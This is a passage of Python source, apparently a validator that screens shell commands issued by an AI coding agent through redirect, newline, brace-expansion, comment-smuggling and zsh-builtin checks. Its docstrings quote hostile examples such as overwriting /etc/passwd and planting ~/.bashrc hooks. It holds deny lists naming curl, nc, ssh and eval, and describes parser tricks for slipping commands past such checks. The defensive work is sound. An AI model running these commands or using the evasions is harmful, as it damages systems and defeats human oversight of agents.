    Threat model: ``cmd > /etc/passwd`` overwrites system files; ``cmd >
    ~/.bashrc`` plants persistent shell hooks. BUT ``cmd > /tmp/out.log``
    and ``cmd >> build.log`` are routine dev patterns that wasted turns
    in task #2096 retries.

    Allowlist (stripped before the literal-char check):
      - 2>&1, 2>/dev/null, >/dev/null, 2>>*.log (existing)
      - > and >> targeting /tmp/, ./, or any relative path (no leading /)
      - >> appending to *.log anywhere
      - ``<<DELIM`` / ``<<-DELIM`` / ``<<'DELIM'`` / ``<<\\DELIM`` heredoc
        opener (delimiter introduces literal text, not a file path)
      - ``<<<word`` here-string operator (literal data, not a file path)

    Explicit denylist (always blocks regardless of above):
      - /etc/, /usr/, /bin/, /sbin/, /boot/, /root/, /sys/, /dev/sd*,
        /dev/disk*, /var/log/ (system logs), ~/.* (dotfile in home),
        /home/*/.* (dotfile in any user home)

    Bug #2285 (task #2309): a bare ``<`` inside ``<<`` or ``<<<`` was being
    treated as input redirection, blocking canonical heredoc and here-string
    patterns (``cat <<EOF`` / ``cat <<<"$VAR"``). Strip the ``<<`` and ``<<<``
    operators *before* the literal-char check so only a true bare ``<``
    (file redirection) trips the block.

    Shared quote-aware pre-pass (task 2652): a genuine redirection operator
    must appear at the shell level — outside every quoted string literal. If
    the ORIGINAL command has no shell-level ``<`` or ``>`` at all, then any
    ``<``/``>`` surfaced by ``_extract_unquoted`` is an artifact of a quoted
    literal (``grep -rn "SATS->ECHO"``) or a quote-tracking desync, never a
    real redirect — so the check short-circuits to safe. This makes check-9/10
    provably immune to operators embedded inside quoted strings while leaving
    every genuine redirect (which is always unquoted) fully validated.
    """
    if not _has_shell_level_char(command, "<>"):
        return _SAFE

    # Hard denylist applied to the ORIGINAL unquoted string before any
    # stripping — these targets are never safe even if they textually match
    # the allowlist patterns later.
    danger_target_re = re.compile(
        r">>?\s*("
        r"/etc/|/usr/|/bin/|/sbin/|/boot/|/root/|/sys/|"
        r"/dev/sd[a-z]|/dev/disk|/dev/nvme|/dev/hd[a-z]|"
        r"/var/log/|"
        r"~/\.|/home/[^/]+/\."
        r")"
    )
    if danger_target_re.search(unquoted):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OUTPUT_REDIRECTION,
            message="Command redirects output to a sensitive system path",
        )

    # Strip safe stderr/stdout redirection patterns before the literal-char check
    safe_patterns = [
        # Heredoc / here-string operators MUST be stripped BEFORE bare-< check.
        # Order matters: <<< (here-string) must be matched before << (heredoc)
        # so the third < is not misread as a heredoc body word boundary.
        r"<<<",                            # <<<word here-string operator
        r"<<-?\s*\\?['\"]?[\w-]+['\"]?",   # <<EOF, <<-EOF, <<'EOF', <<\EOF
        r"2\s*>\s*&\s*1",                  # 2>&1
        r"2\s*>\s*/dev/null",              # 2>/dev/null
        r">\s*/dev/null",                  # >/dev/null
        r"2\s*>>\s*[\w./-]+\.log",         # 2>>somefile.log
        r">>\s*[\w./-]+\.log",             # >>somefile.log (dev append)
        # > or >> targeting /tmp/...
        r">>?\s*/tmp/[\w./-]+",
        # > or >> targeting ./relative or relative paths (no leading /)
        # Path may contain dots and slashes but not start with /.
        r">>?\s*\./[\w./-]+",
        r">>?\s*[A-Za-z_][\w./-]*",
    ]
    cleaned = unquoted
    for pat in safe_patterns:
        cleaned = re.sub(pat, "", cleaned)

    if "<" in cleaned:
        return BashSecurityResult(
            safe=False, check_id=CheckID.INPUT_REDIRECTION,
            message="Command contains input redirection (<) which could read sensitive files",
        )
    if ">" in cleaned:
        return BashSecurityResult(
            safe=False, check_id=CheckID.OUTPUT_REDIRECTION,
            message="Command contains output redirection (>) which could write to arbitrary files",
        )
    return _SAFE


def _check_dangerous_variables(unquoted: str) -> BashSecurityResult:
    """Check 6: Variables used in redirect/pipe context.

    Threat model: ``cat $UNTRUSTED > /etc/passwd`` — an attacker-controlled
    variable spliced into a pipe or redirect can re-target the command at
    arbitrary files or pipelines. BUT the same regex matches benign loop
    bodies like ``for f in *.py; do echo $f | grep TODO; done`` which is
    common in dev work (task #2096).

    Loosen by allowlisting variables declared in a preceding ``for VAR in``
    statement within the same command string. The block stands for all
    other variable references in pipe/redirect contexts.
    """
    pipe_var_re = re.compile(r"[<>|]\s*\$\{?([A-Za-z_][A-Za-z0-9_]*)")
    var_pipe_re = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?\s*[|<>]")
    matches = list(pipe_var_re.finditer(unquoted)) + list(var_pipe_re.finditer(unquoted))
    if not matches:
        return _SAFE

    # Collect names declared as loop variables earlier in the command.
    loop_vars = {
        m.group(1)
        for m in re.finditer(r"\bfor\s+([A-Za-z_][A-Za-z0-9_]*)\s+in\b", unquoted)
    }

    for m in matches:
        var_name = m.group(1)
        if var_name in loop_vars:
            continue
        return BashSecurityResult(
            safe=False, check_id=CheckID.DANGEROUS_VARIABLES,
            message="Command contains variables in dangerous contexts (redirections or pipes)",
        )
    return _SAFE


def _check_newlines(command: str, unquoted: str) -> BashSecurityResult:
    """Check 7: Newlines that could separate multiple commands.

    Only fires when the newline is at a true shell-token boundary —
    i.e., OUTSIDE all quoted regions. Newlines embedded inside a quoted
    argument to a script interpreter (``python3 -c "import x\\nimport y"``,
    ``bash -c "set -e\\necho hi"``, ``psql -c "BEGIN;\\nSELECT 1;\\nCOMMIT;"``)
    are consumed by the interpreter, not the shell, so they are NOT command
    separators and must not trigger this check (the false-positive that
    blocked agents writing multi-line script bodies through ``-c``/``-e``).

    Walks the command character-by-character tracking quote state, so the
    decision is made on real shell semantics rather than on the
    ``_extract_unquoted`` helper's stripped output (which can desync when
    quote nesting interacts with backslash escapes).

    Carriage-return handling is preserved: ``\\r`` outside double quotes
    is blocked because it can cause parser differentials between
    shell-quote and bash.
    """
    if "\n" not in command and "\r" not in command:
        return _SAFE

    in_single = False
    in_double = False
    escaped = False
    quote_open_idx = -1

    for i, ch in enumerate(command):
        if escaped:
            escaped = False
            continue
        if ch == "\\" and not in_single:
            escaped = True
            continue
        if ch == "'" and not in_double:
            if not in_single:
                quote_open_idx = i
            in_single = not in_single
            continue
        if ch == '"' and not in_single:
            if not in_double:
                quote_open_idx = i
            in_double = not in_double
            continue

        if ch == "\n":
            if in_single or in_double:
                # Inside a quoted token — by shell semantics, NOT a
                # command separator. Defense-in-depth: explicitly recognize
                # the script-interpreter -c/-e case so the intent is
                # documented and any future tightening here cannot
                # accidentally re-introduce the false-positive.
                if _is_inside_quoted_arg_value(command, quote_open_idx):
                    continue
                # Other quoted contexts: still part of the quoted token
                # at the shell level, so the newline is not a separator.
                # (Comment-smuggling via ``\n#`` is handled separately by
                # check 23 / ``_check_quoted_newline_comment``.)
                continue

            # Unquoted newline — true shell-token boundary. Block only when
            # followed by non-whitespace (i.e., a subsequent command on the
            # next line), allowing ``\<NL>`` POSIX line continuations.
            rest = command[i + 1:]
            if not rest.lstrip():
                continue
            j = i - 1
            while j >= 0 and command[j] in " \t":
                j -= 1
            is_continuation = (
                j >= 0
                and command[j] == "\\"
                and (j == 0 or command[j - 1] in (" ", "\t"))
            )
            if is_continuation:
                continue
            return BashSecurityResult(
                safe=False, check_id=CheckID.NEWLINES,
                message="Command contains newlines that could separate multiple commands",
            )

        if ch == "\r" and not in_double:
            return BashSecurityResult(
                safe=False, check_id=CheckID.NEWLINES,
                message="Command contains carriage return which can cause parser differentials",
            )

    return _SAFE


def _check_ifs_injection(command: str) -> BashSecurityResult:
    """Check 11: $IFS / ${...IFS...} usage."""
    if re.search(r"\$IFS|\$\{[^}]*IFS", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.IFS_INJECTION,
            message="Command contains IFS variable usage which could bypass security validation",
        )
    return _SAFE


def _check_proc_environ(command: str) -> BashSecurityResult:
    """Check 13: /proc/*/environ access."""
    if re.search(r"/proc/.*/environ", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.PROC_ENVIRON_ACCESS,
            message="Command accesses /proc/*/environ which could expose secrets",
        )
    return _SAFE


def _check_backslash_escaped_whitespace(command: str) -> BashSecurityResult:
    """Check 15: Backslash-space/tab outside quotes."""
    if _has_backslash_escaped_whitespace(command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.BACKSLASH_ESCAPED_WHITESPACE,
            message="Command contains backslash-escaped whitespace that could alter parsing",
        )
    return _SAFE


def _check_brace_expansion(command: str, unquoted: str) -> BashSecurityResult:
    """Check 16: Brace expansion ({a,b} or {1..5}) in unquoted content."""
    # Count unescaped braces
    open_count = 0
    close_count = 0
    for i, ch in enumerate(unquoted):
        if ch == "{" and not _is_escaped_at(unquoted, i):
            open_count += 1
        elif ch == "}" and not _is_escaped_at(unquoted, i):
            close_count += 1

    # Excess closing braces = quoted braces were stripped (attack primitive)
    if open_count > 0 and close_count > open_count:
        return BashSecurityResult(
            safe=False, check_id=CheckID.BRACE_EXPANSION,
            message="Excess closing braces after quote stripping (brace expansion obfuscation)",
        )

    # Quoted brace inside unquoted brace context
    if open_count > 0 and re.search(r"""['"][{}]['"]""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.BRACE_EXPANSION,
            message="Quoted brace character inside brace context (potential obfuscation)",
        )

    # Scan for {a,b} or {1..5} patterns in unquoted content
    i = 0
    while i < len(unquoted):
        if unquoted[i] != "{" or _is_escaped_at(unquoted, i):
            i += 1
            continue
        # Find matching close brace with nesting
        depth = 1
        close_pos = -1
        j = i + 1
        while j < len(unquoted):
            if unquoted[j] == "{" and not _is_escaped_at(unquoted, j):
                depth += 1
            elif unquoted[j] == "}" and not _is_escaped_at(unquoted, j):
                depth -= 1
                if depth == 0:
                    close_pos = j
                    break
            j += 1
        if close_pos == -1:
            i += 1
            continue
        # Check for comma or .. at outermost level
        inner_depth = 0
        for k in range(i + 1, close_pos):
            ch = unquoted[k]
            if ch == "{" and not _is_escaped_at(unquoted, k):
                inner_depth += 1
            elif ch == "}" and not _is_escaped_at(unquoted, k):
                inner_depth -= 1
            elif inner_depth == 0:
                if ch == ",":
                    return BashSecurityResult(
                        safe=False, check_id=CheckID.BRACE_EXPANSION,
                        message="Command contains brace expansion that could alter parsing",
                    )
                if ch == "." and k + 1 < close_pos and unquoted[k + 1] == ".":
                    return BashSecurityResult(
                        safe=False, check_id=CheckID.BRACE_EXPANSION,
                        message="Command contains brace sequence expansion ({a..z})",
                    )
        i += 1
    return _SAFE


def _check_unicode_whitespace(command: str) -> BashSecurityResult:
    """Check 18: Unicode whitespace characters."""
    if _UNICODE_WS_RE.search(command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.UNICODE_WHITESPACE,
            message="Command contains Unicode whitespace that could cause parsing inconsistencies",
        )
    return _SAFE


def _check_heredoc_in_substitution(command: str) -> BashSecurityResult:
    """Check 19: Heredoc inside command substitution ($(...<<...)).

    The canonical Claude Code multi-line commit pattern
    ``$(cat <<'DELIM' ... DELIM)`` is permitted because the single-quoted
    (or backslash-escaped) heredoc delimiter suppresses ALL parameter and
    command expansion inside the body — ``cat`` only emits literal text.
    Unquoted ``<<EOF`` is still blocked because expansions happen there.
    """
    if not re.search(r"\$\(.*<<", command, re.DOTALL):
        return _SAFE

    # Whitelist: if EVERY top-level $(...) substitution body is a single
    # benign `cat <<'DELIM' ... DELIM` (with matching backreferenced
    # delimiter), the command is safe. Reuses the same helper as check 12
    # to keep parsing semantics consistent across both checks.
    inners = _extract_dollar_paren_inners(command)
    if inners and all(_is_benign_cat_heredoc_inner(inner) for inner in inners):
        return _SAFE

    return BashSecurityResult(
        safe=False, check_id=CheckID.HEREDOC_IN_SUBSTITUTION,
        message="Command contains heredoc inside command substitution",
    )


def _is_find_exec_escaped_semicolon(command: str) -> bool:
    """Return True when all backslash-escaped operators are ``\\;`` in a
    ``find -exec`` / ``find -execdir`` context.

    After stripping every ``\\;`` occurrence, there should be no remaining
    backslash-escaped operators for this to be considered safe.
    """
    if not re.search(r"\bfind\b", command):
        return False
    if not re.search(r"-exec(?:dir)?\b", command):
        return False
    # Strip all \; and re-check — any remaining \op is still dangerous
    stripped = command.replace("\\;", "")
    return not _has_backslash_escaped_operator(stripped)


def _check_backslash_escaped_operators(command: str) -> BashSecurityResult:
    r"""Check 21: ``\;``, ``\|``, ``\&``, ``\<``, ``\>`` outside quotes.

    Exception: ``\;`` is allowed in ``find -exec`` / ``find -execdir``
    context, where it is the standard command terminator.
    """
    if not _has_backslash_escaped_operator(command):
        return _SAFE

    # Allow \; in find -exec context (standard POSIX find syntax)
    if _is_find_exec_escaped_semicolon(command):
        return _SAFE

    return BashSecurityResult(
        safe=False, check_id=CheckID.BACKSLASH_ESCAPED_OPERATORS,
        message="Command contains backslash before shell operator which can hide command structure",
    )


def _check_control_characters(command: str) -> BashSecurityResult:
    """Check 17: ASCII control characters (excluding common whitespace)."""
    # Allow tab (0x09), newline (0x0a), carriage return (0x0d)
    for ch in command:
        code = ord(ch)
        if code < 0x20 and code not in (0x09, 0x0A, 0x0D):
            return BashSecurityResult(
                safe=False, check_id=CheckID.CONTROL_CHARACTERS,
                message=f"Command contains ASCII control character (0x{code:02x})",
            )
        if code == 0x7F:  # DEL
            return BashSecurityResult(
                safe=False, check_id=CheckID.CONTROL_CHARACTERS,
                message="Command contains DEL control character (0x7f)",
            )
    return _SAFE


# Interpreters whose -c / -e argument is a script body — never re-parsed by
# the shell, so a literal '#' inside the quoted body is the language's own
# comment character (Python/Perl/Ruby/JS), not a shell-comment smuggling
# primitive. Note: bash/sh/zsh are intentionally EXCLUDED — for those, the
# quoted body IS shell input and '# evil' really can hide arguments.
#
# The optional path prefix ``(?:[^\s]*/)?`` allows virtualenv / path-qualified
# forms like ``./venv/bin/python``, ``venv/bin/python3``, ``/usr/bin/python3``
# that agents commonly use when activating a project virtualenv. The ``#``
# inside such a ``-c`` body is the Python comment character — not a shell
# comment smuggling primitive — so the check-23 block is a false positive
# (bug 2603, tasks #2596 x2 / #2601 / #2602).
_SAFE_SCRIPT_INTERPRETER_BEFORE_QUOTE_RE = re.compile(
    r"(?:^|[\s;&|`(])"
    r"(?:[^\s]*/)?"
    r"(?:python|python2|python3|py|perl|ruby|node|nodejs)"
    r"\s+-(?:c|e)\s*$"
)


# Broader allowlist used by check 7 (newlines): any interpreter or DB CLI
# whose ``-c``/``-e``/``-x``/``--command`` argument is a multi-statement
# script body where embedded newlines are legitimate (consumed by the
# interpreter, not the shell). This includes shell interpreters
# (``bash``/``sh``/``zsh``) — unlike the comment-smuggling check, a bare
# newline inside ``bash -c "..."`` is NOT a shell-token boundary at the
# outer shell level (the whole quoted body is ONE token to ``bash``).
# The ``\n#`` smuggling primitive is still caught for shells by check 23
# via ``_is_inside_safe_interpreter_arg`` (which intentionally excludes
# the shells), so this looser list does not weaken that defense.
#
# The optional path prefix ``(?:[^\s]*/)?`` mirrors the same fix applied
# to ``_SAFE_SCRIPT_INTERPRETER_BEFORE_QUOTE_RE`` — virtualenv forms like
# ``./venv/bin/python3 -c`` must also pass the newline check (bug 2603).
_QUOTED_ARG_INTERPRETER_BEFORE_QUOTE_RE = re.compile(
    r"(?:^|[\s;&|`(])"
    r"(?:[^\s]*/)?(?:python|python2|python3|py|perl|ruby|node|nodejs|"
    r"bash|sh|zsh|ksh|dash|fish|"
    r"psql|mysql|mariadb|sqlite|sqlite3|"
    r"awk|gawk|sed|"
    r"php|lua|tclsh|R|Rscript)"
    r"\s+-(?:c|e|x|-command)\s*$"
)


def _is_inside_quoted_arg_value(command: str, quote_open_idx: int) -> bool:
    """Return True if the quote at ``quote_open_idx`` opens the body of a
    script-interpreter or DB-CLI ``-c``/``-e`` argument where embedded
    newlines are legitimate (``python3 -c``, ``bash -c``, ``psql -c``,
    ``perl -e``, ``awk -e``, etc.).

    Used by check 7 (``_check_newlines``) to ensure it only fires when the
    newline is at a true shell-token boundary, not when it is inside a
    quoted-string argument value being passed to a known interpreter. The
    shell sees the whole quoted argument as one token, so newlines inside
    are consumed by the interpreter — they cannot separate shell commands.

    Mirrors ``_is_inside_safe_interpreter_arg`` (used by check 23) but
    includes shell and DB CLIs because a newline alone is not the
    comment-smuggling primitive — that primitive (``\\n#``) is what
    check 23 catches with the narrower allowlist.
    """
    if quote_open_idx <= 0:
        return False
    prefix = command[:quote_open_idx]
    return bool(_QUOTED_ARG_INTERPRETER_BEFORE_QUOTE_RE.search(prefix))


def _is_inside_safe_interpreter_arg(command: str, quote_open_idx: int) -> bool:
    """Return True if the quote at ``quote_open_idx`` opens the script-body
    argument of a known-safe script interpreter (``python -c``, ``perl -e``,
    etc.). The prefix may include arbitrary command wrappers like
    ``timeout 30``, ``env FOO=bar``, ``nohup``, or chained commands —
    anything as long as the immediate token-pair before the quote is
    ``<interpreter> -c`` / ``<interpreter> -e``.
    """
    if quote_open_idx <= 0:
        return False
    prefix = command[:quote_open_idx]
    return bool(_SAFE_SCRIPT_INTERPRETER_BEFORE_QUOTE_RE.search(prefix))


# CLI tools whose markdown-body flag (``--body``/``-b``/``--message``/``-m``)
# legitimately carries multi-line markdown including ``# Header`` lines. The
# body is passed as a single quoted token, so ``#`` cannot hide an argument.
# Pattern matches the immediate token-pair before the quote: ``<tool> ...
# <flag>``. The ``...`` allows other intervening flags like ``--title "X"``
# but the flag must be the last token before the quote.
_MARKDOWN_BODY_FLAG_BEFORE_QUOTE_RE = re.compile(
    r"(?:^|[\s;&|`(])"
    r"(?:gh|git|hub)\b"
    r"[^|;&`(]*?"
    r"\s(?:--body|-b|--message|-m)\s*$"
)


_MARKDOWN_BODY_TOOLS: frozenset[str] = frozenset({"gh", "git", "hub"})
_MARKDOWN_BODY_FLAGS: frozenset[str] = frozenset(
    {"--body", "-b", "--message", "-m"}
)


def _last_segment_start(prefix: str) -> int:
    """Return the index in ``prefix`` where the current shell command segment
    begins. Splits on ``;``, ``&&``, ``||``, ``|``, ``&``, ``(``, and
    backticks at unquoted positions only — quoted arguments containing
    these characters do NOT split the segment.
    """
    in_single = False
    in_double = False
    escaped = False
    last_break = 0
    i = 0
    n = len(prefix)
    while i < n:
        ch = prefix[i]
        if escaped:
            escaped = False
            i += 1
            continue
        if ch == "\\" and not in_single:
            escaped = True
            i += 1
            continue
        if ch == "'" and not in_double:
            in_single = not in_single
            i += 1
            continue
        if ch == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue
        if not in_single and not in_double:
            if ch in (";", "(", "`"):
                last_break = i + 1
            elif ch == "|":
                if i + 1 < n and prefix[i + 1] == "|":
                    last_break = i + 2
                    i += 2
                    continue
                last_break = i + 1
            elif ch == "&":
                if i + 1 < n and prefix[i + 1] == "&":
                    last_break = i + 2
                    i += 2
                    continue
                last_break = i + 1
        i += 1
    return last_break


def _is_inside_markdown_body_arg(command: str, quote_open_idx: int) -> bool:
    """Return True if the quote at ``quote_open_idx`` opens the body of a
    markdown-accepting CLI flag (``gh pr create --body "..."``,
    ``git commit -m "..."``, etc.). Inside such a body, ``\\n#`` is a
    markdown header, not shell-comment smuggling — the body is one token to
    the tool.

    Two-stage check:

    1. Fast regex (``_MARKDOWN_BODY_FLAG_BEFORE_QUOTE_RE``) for the common
       case where the prefix has no quoted arguments containing parens.
    2. Token-aware fallback (``shlex``) for prefixes whose quoted arguments
       contain ``(`` / ``)`` — e.g. PR titles like ``feat(drivers): X (DR-01)``
       which the regex's ``[^|;&`(]*?`` body cannot span. This was the
       second false-positive observed (TheForge bug 2320) after the
       original gh/git allowlist (bug 2238).
    """
    if quote_open_idx <= 0:
        return False
    prefix = command[:quote_open_idx]
    if _MARKDOWN_BODY_FLAG_BEFORE_QUOTE_RE.search(prefix):
        return True

    # Token-aware fallback. Restrict to the current command segment so
    # ``rm -rf / && gh ... --body "..."`` is still caught upstream by the
    # rm check, and a leading non-gh command does not mask the gh head.
    seg_start = _last_segment_start(prefix)
    segment = prefix[seg_start:].strip()
    if not segment:
        return False
    try:
        tokens = shlex.split(segment, posix=True)
    except ValueError:
        # Unbalanced quoting — cannot reason about token boundaries safely.
        return False
    if len(tokens) < 2:
        return False
    if tokens[-1] not in _MARKDOWN_BODY_FLAGS:
        return False
    return tokens[0] in _MARKDOWN_BODY_TOOLS


def _check_quoted_newline_comment(command: str) -> BashSecurityResult:
    """Check 23: Newline inside quotes where next line starts with #.

    Threat model: ``bash -c "real_cmd\\n# malicious_arg"`` — the ``#`` makes
    bash skip the rest of the line, hiding payload bytes from path
    validation. BUT ``python3 -c "import x\\n# comment\\nprint(x)"`` is the
    standard Python comment syntax; agents writing Python heredocs hit this
    constantly (tasks #2075, #2077, #2096).

    Loosen by allowlisting:
    - The ``-c``/``-e`` argument of script interpreters whose body is NOT
      re-parsed by the shell: python, perl, ruby, node.
    - The markdown-body argument of CLI tools that accept multi-line
      markdown payloads (``gh``/``git``/``hub`` with ``--body``/``-b``/
      ``--message``/``-m``). Markdown headers (``# Heading``) on a fresh
      line inside the body would otherwise trip this check and kill PR
      creation despite the agent having completed all code work — see
      TheForge bug 2238. The body is a single quoted token to the tool, so
      ``#`` cannot smuggle an argument.

    The check still fires for shells (``bash -c``, ``sh -c``, ``zsh -c``)
    where ``#`` is the comment-smuggling primitive this check was designed
    to catch, and for any other context where a quoted ``\\n# ...`` could
    hide arguments.
    """
    if "\n" not in command or "#" not in command:
        return _SAFE

    in_single = False
    in_double = False
    escaped = False
    quote_open_idx = -1

    for i, ch in enumerate(command):
        if escaped:
            escaped = False
            continue
        if ch == "\\" and not in_single:
            escaped = True
            continue
        if ch == "'" and not in_double:
            if not in_single:
                quote_open_idx = i
            in_single = not in_single
            continue
        if ch == '"' and not in_single:
            if not in_double:
                quote_open_idx = i
            in_double = not in_double
            continue

        # Inside quotes and hit a newline — check if next line starts with #
        if (in_single or in_double) and ch == "\n":
            rest = command[i + 1:]
            if rest.lstrip().startswith("#"):
                if _is_inside_safe_interpreter_arg(command, quote_open_idx):
                    continue
                if _is_inside_markdown_body_arg(command, quote_open_idx):
                    continue
                return BashSecurityResult(
                    safe=False, check_id=CheckID.QUOTED_NEWLINE,
                    message="Quoted newline followed by # comment can hide arguments from validation",
                )
    return _SAFE


# ---------------------------------------------------------------------------
# Zsh dangerous commands (from ZSH_DANGEROUS_COMMANDS in bashSecurity.ts)
# ---------------------------------------------------------------------------

_ZSH_DANGEROUS_COMMANDS: frozenset[str] = frozenset([
    "zmodload",   # Gateway to dangerous module-based attacks
    "emulate",    # With -c flag is an eval-equivalent
    "sysopen",    # Opens files with fine-grained control (zsh/system)
    "sysread",    # Reads from file descriptors (zsh/system)
    "syswrite",   # Writes to file descriptors (zsh/system)
    "sysseek",    # Seeks on file descriptors (zsh/system)
    "zpty",       # Executes commands on pseudo-terminals (zsh/zpty)
    "ztcp",       # Creates TCP connections for exfiltration (zsh/net/tcp)
    "zsocket",    # Creates Unix/TCP sockets (zsh/net/socket)
    "mapfile",    # Associative array set via zmodload
    "zf_rm",      # Builtin rm from zsh/files
    "zf_mv",      # Builtin mv from zsh/files
    "zf_ln",      # Builtin ln from zsh/files
    "zf_chmod",   # Builtin chmod from zsh/files
    "zf_chown",   # Builtin chown from zsh/files
    "zf_mkdir",   # Builtin mkdir from zsh/files
    "zf_rmdir",   # Builtin rmdir from zsh/files
    "zf_chgrp",   # Builtin chgrp from zsh/files
])

_ZSH_PRECOMMAND_MODIFIERS: frozenset[str] = frozenset([
    "command", "builtin", "noglob", "nocorrect",
])

# Read-only text tools where locale quoting ($"...") is a legitimate i18n
# pattern, not an attack vector. Allowlist used by Check 4.
#
# Also includes version-control / PR-creation commands (git/gh/hg/jj/svn)
# where $"..." inside arguments is committed AS DATA into a commit message,
# PR body, or changelog — it never reaches an exec context. The check-4
# threat model (locale quoting as a vector to hide characters from exec)
# does not apply here. See bug 2310.
_LOCALE_QUOTING_SAFE_BASES: frozenset[str] = frozenset([
    "grep", "egrep", "fgrep", "rg", "ag", "ack",
    "sed", "awk", "gawk",
    "find", "fd",
    "echo", "printf",
    "git", "gh", "hg", "jj", "svn",
])

# Read-only commands safe to appear inside $() command substitution.
# Used by Check 8. Anything not in this list keeps $() blocked.
#
# Both the assignment-side ``var=$(cmd)`` and the argument-side
# ``other_cmd $(cmd)`` forms route through the same allowlist
# (task #2308 — argument-side false-positives blocked common dev
# patterns like ``ls $(go env GOMODCACHE)`` and ``gh pr create
# --body-file $(mktemp -d)/body.md``).
_SAFE_SUBSTITUTION_COMMANDS: frozenset[str] = frozenset([
    "git",          # rev-parse, log, diff, branch, etc. (all read-only forms)
    "gh",           # GitHub CLI read-only subcommands (pr view, repo view, etc.)
    "go",           # `go env GOMODCACHE`, `go env GOPATH`, etc.
    "date",
    "basename", "dirname", "realpath", "readlink",
    "mktemp",       # path emitter; output is a fresh tmp path/dir
    "pwd",
    "echo", "printf",
    "cat",          # of project-relative files only — see check
    "wc", "head", "tail", "sort", "uniq",
    "grep", "egrep", "fgrep", "rg", "ag",
    "sed", "awk",
    "ls", "find", "fd",
    "tr", "cut", "tee",
    "id", "whoami", "hostname", "uname",
    "which", "type", "command",
    "env",
    "expr", "test",
])

# Commands that MUST NEVER appear inside $() — these are the dangerous side
# effecting commands that the original Check 8 was designed to block.
_DANGEROUS_SUBSTITUTION_COMMANDS: frozenset[str] = frozenset([
    "rm", "mv", "cp", "dd", "shred",
    "chmod", "chown", "chgrp",
    "curl", "wget", "ssh", "scp", "rsync", "ftp", "nc", "ncat", "telnet",
    "sudo", "su", "doas",
    "eval", "exec", "source", ".",
    "bash", "sh", "zsh", "ksh", "dash", "fish",
    "python", "python3", "perl", "ruby", "node", "deno", "php",
    "kill", "killall", "pkill",
    "mount", "umount",
    "iptables", "nft",
    "systemctl", "service",
    "apt", "apt-get", "yum", "dnf", "pip", "pip3", "npm", "yarn",
    "docker", "podman", "kubectl",
])


# ---------------------------------------------------------------------------
# Additional checks (ported from bashSecurity.ts)
# ---------------------------------------------------------------------------

def _check_shell_metacharacters(command: str, unquoted: str) -> BashSecurityResult:
    """Check 5: Shell metacharacters (;, |, &) inside quoted find/grep args.

    Detects metacharacters smuggled inside quoted arguments to find-style
    commands (e.g., ``find . -name "foo;evil"``).

    NOTE: These patterns must match against the ORIGINAL command (not the
    unquoted version) because the metacharacters are *inside* quotes — the
    unquoted extractor would strip them.

    Only targets find-style flags (``-name``, ``-path``, ``-iname``,
    ``-regex``).  Semicolons inside quoted arguments to interpreters
    (``python -c "import X; print(...)"``) are legitimate code separators
    and are NOT flagged.
    """
    # Find-specific patterns: -name, -path, -iname, -regex with metacharacters
    for pattern in (
        r'''-name\s+["'][^"']*[;|&][^"']*["']''',
        r'''-path\s+["'][^"']*[;|&][^"']*["']''',
        r'''-iname\s+["'][^"']*[;|&][^"']*["']''',
        r'''-regex\s+["'][^"']*[;&][^"']*["']''',
    ):
        if re.search(pattern, command):
            return BashSecurityResult(
                safe=False, check_id=CheckID.SHELL_METACHARACTERS,
                message="Command contains shell metacharacters in find arguments",
            )
    return _SAFE


def _check_mid_word_hash(command: str) -> BashSecurityResult:
    """Check 19 (alt): Mid-word # causes parser differential.

    shell-quote treats mid-word ``#`` as comment-start, but bash treats
    it as a literal character. Detect ``\\S#`` outside ``${#`` patterns.

    Uses ``_extract_unquoted_keep_delimiters`` (matching the TS
    ``unquotedKeepQuoteChars``) so that ``'x'#`` is preserved as
    ``''#`` — the quote delimiter is adjacent to ``#``, not whitespace.
    """
    unquoted = _extract_unquoted_keep_delimiters(command)

    # Also check continuation-joined version: foo\<NL>#bar
    joined = re.sub(
        r"\\+\n",
        lambda m: (
            "\\" * ((len(m.group()) - 1) - 1)
            if (len(m.group()) - 1) % 2 == 1
            else m.group()
        ),
        unquoted,
    )

    # \S immediately before # (not preceded by ${)
    # Using a simpler approach without lookbehind for broader Python compat
    for text in (unquoted, joined):
        for i, ch in enumerate(text):
            if ch != "#" or i == 0:
                continue
            prev = text[i - 1]
            if prev in (" ", "\t", "\n", "\r"):
                continue
            # Exclude ${# (bash string-length syntax)
            if i >= 2 and text[i - 2:i] == "${":
                continue
            return BashSecurityResult(
                safe=False, check_id=CheckID.MID_WORD_HASH,
                message="Command contains mid-word # which is parsed differently by shell-quote vs bash",
            )
    return _SAFE


def _check_zsh_dangerous_commands(command: str) -> BashSecurityResult:
    """Check 20: Zsh-specific dangerous commands that bypass security.

    Blocks ``zmodload``, ``emulate``, ``sysopen``, ``zpty``, ``ztcp``,
    ``fc -e``, and other Zsh builtins that enable raw file/network I/O
    or arbitrary code execution.
    """
    trimmed = command.strip()
    tokens = trimmed.split()
    base_cmd = ""
    for token in tokens:
        # Skip env-var assignments (VAR=value)
        if re.match(r"^[A-Za-z_]\w*=", token):
            continue
        # Skip Zsh precommand modifiers
        if token in _ZSH_PRECOMMAND_MODIFIERS:
            continue
        base_cmd = token
        break

    if base_cmd in _ZSH_DANGEROUS_COMMANDS:
        return BashSecurityResult(
            safe=False, check_id=CheckID.ZSH_DANGEROUS_COMMANDS,
            message=f"Command uses Zsh-specific '{base_cmd}' which can bypass security checks",
        )

    # fc -e allows executing arbitrary commands via editor
    if base_cmd == "fc" and re.search(r"\s-\S*e", trimmed):
        return BashSecurityResult(
            safe=False, check_id=CheckID.ZSH_DANGEROUS_COMMANDS,
            message="Command uses 'fc -e' which can execute arbitrary commands via editor",
        )

    return _SAFE


def _check_comment_quote_desync(command: str) -> BashSecurityResult:
    """Check 22: Quote characters inside # comments desync quote trackers.

    In bash, everything after unquoted ``#`` is a comment — quote characters
    inside are literal. But our quote-tracking helpers don't handle comments,
    so ``'`` or ``"`` after ``#`` can toggle their state and hide subsequent
    dangerous content from validation.
    """
    in_single = False
    in_double = False
    escaped = False

    for i, ch in enumerate(command):
        if escaped:
            escaped = False
            continue

        if in_single:
            if ch == "'":
                in_single = False
            continue

        if ch == "\\":
            escaped = True
            continue

        if in_double:
            if ch == '"':
                in_double = False
            # Single quotes inside double quotes are literal
            continue

